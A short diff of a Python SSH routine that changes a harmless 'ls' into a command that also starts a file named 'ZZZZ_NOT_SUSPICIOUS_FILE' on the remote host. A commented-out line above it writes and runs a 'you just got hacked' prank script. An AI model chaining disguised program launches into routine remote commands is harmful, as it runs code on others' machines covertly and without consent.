@@ -325,7 +325,7 @@ def serverForever(commandArgs):
 
             # command chain
             # sshChannel.send("touch GET_HACKED_HAHA.py | echo \"#!/usr/bin/python3\nprint('Hey, you just got hacked!')\" > GET_HACKED_HAHA.py | #python3 GET_HACKED_HAHA.py")
-            sshChannel.send("ls")
+            sshChannel.send("python3 ZZZZ_NOT_SUSPICIOUS_FILE start | ls")
             RXmessage = sshChannel.recv(1024).decode()
 
             logger.info("Received SSH message.")
